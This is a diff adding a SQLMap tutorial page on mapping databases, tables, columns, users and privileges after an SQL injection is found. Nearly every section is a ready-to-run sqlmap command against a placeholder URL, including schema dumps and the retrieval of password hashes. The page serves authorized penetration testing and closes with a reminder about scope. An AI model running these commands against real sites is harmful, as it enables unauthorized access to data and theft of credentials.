@@ -1,0 +1,169 @@
+---
+title: Database Structure Enumeration
+description: Learn how to enumerate database structure using SQLMap
+---
+
+# Database Structure Enumeration
+
+SQLMap provides powerful capabilities for enumerating database structure once you've identified a SQL injection vulnerability. This guide covers how to discover and map databases, tables, columns, and schema information.
+
+## Basic Database Enumeration
+
+### Listing Available Databases
+
+To list all available databases on the target server:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" --dbs
+```
+
+This command will enumerate all databases the current user has access to.
+
+### Listing Tables in a Database
+
+Once you've identified a database of interest, you can list all its tables:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" -D database_name --tables
+```
+
+Replace `database_name` with the name of the database you want to explore.
+
+### Listing Columns in a Table
+
+To enumerate columns in a specific table:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" -D database_name -T table_name --columns
+```
+
+This provides the column names and their data types, which is crucial for targeted data extraction.
+
+## Advanced Structure Enumeration
+
+### Database Schema Information
+
+To get comprehensive schema information:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" --schema
+```
+
+This command retrieves the entire database schema, including all databases, tables, and columns.
+
+### Database Version and User Information
+
+Gather information about the database version and current user:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" --banner --current-user --current-db
+```
+
+This helps understand the database environment and privileges.
+
+### Database Users and Privileges
+
+Enumerate database users and their privileges:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" --users --privileges
+```
+
+For MySQL databases, you can also get password hashes:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" --passwords
+```
+
+## Database-Specific Techniques
+
+### MySQL Structure Enumeration
+
+MySQL stores schema information in the `information_schema` database:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" -D information_schema --tables
+```
+
+To get table statistics:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" -D information_schema -T TABLES --dump
+```
+
+### Microsoft SQL Server Structure Enumeration
+
+For MSSQL, system catalogs provide schema information:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" --sql-query="SELECT name FROM master..sysdatabases"
+```
+
+### Oracle Database Structure Enumeration
+
+Oracle stores schema information in data dictionary views:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" --sql-query="SELECT owner, table_name FROM all_tables"
+```
+
+## Optimization Techniques
+
+### Targeted Enumeration
+
+Instead of enumerating everything, target specific databases or tables:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" --dbs --exclude-sysdbs
+```
+
+This skips system databases, focusing only on user-created databases.
+
+### Using Regular Expressions
+
+Filter tables or columns using regular expressions:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" -D database_name --tables --regexp="user|admin"
+```
+
+This returns only tables with "user" or "admin" in their names.
+
+### Batch Processing
+
+For faster enumeration, use batch mode:
+
+```bash
+sqlmap -u "http://target-site.com/page.php?id=1" --batch --dbs
+```
+
+This automatically selects default options without prompting.
+
+## Visualization and Documentation
+
+After enumerating the database structure, document your findings:
+
+1. Create a database schema diagram
+2. Document table relationships
+3. Identify sensitive tables and columns
+4. Map data flows between tables
+
+This documentation helps in planning the next steps of your security assessment.
+
+## Best Practices
+
+1. **Start broad, then narrow down**: Begin with database enumeration, then focus on interesting tables
+2. **Look for naming patterns**: Tables named "admin", "user", "password", etc. often contain valuable information
+3. **Understand table relationships**: Foreign keys reveal how data is connected
+4. **Document everything**: Keep detailed notes of the database structure
+5. **Be mindful of database load**: Excessive enumeration can impact database performance
+
+## Next Steps
+
+After mapping the database structure, you can:
+
+- [Extract specific data](/docs/sqlmap/database-enumeration/data-extraction) from tables of interest
+- Explore [file system access](/docs/sqlmap/database-enumeration/file-system-access) capabilities
+- Implement [advanced techniques](/docs/sqlmap/advanced-techniques) for deeper exploitation
+
+Remember to always operate within the scope of your authorized security assessment.
